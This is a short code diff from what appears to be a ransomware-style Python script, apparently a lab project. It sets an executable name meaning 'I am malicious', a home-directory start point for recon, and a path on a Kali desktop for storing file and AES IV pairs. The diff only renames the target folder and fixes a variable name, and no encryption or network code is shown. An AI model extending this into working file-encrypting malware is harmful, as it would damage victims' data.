@@ -8,10 +8,10 @@ whatismyname = "zararliyim.exe"
 
 # the beginning point of recon
 root_directory = os.path.expanduser('~')
-root_directory = os.path.join(root_directory,"test")
+root_directory = os.path.join(root_directory,"test2")
 
 # where to write the pairs made up of a file and AES IV
-aesIV-File_store_path = "/home/kali/desktop"
+aesIV_File_store_path = "/home/kali/desktop"
 
 
 os_name = os.name
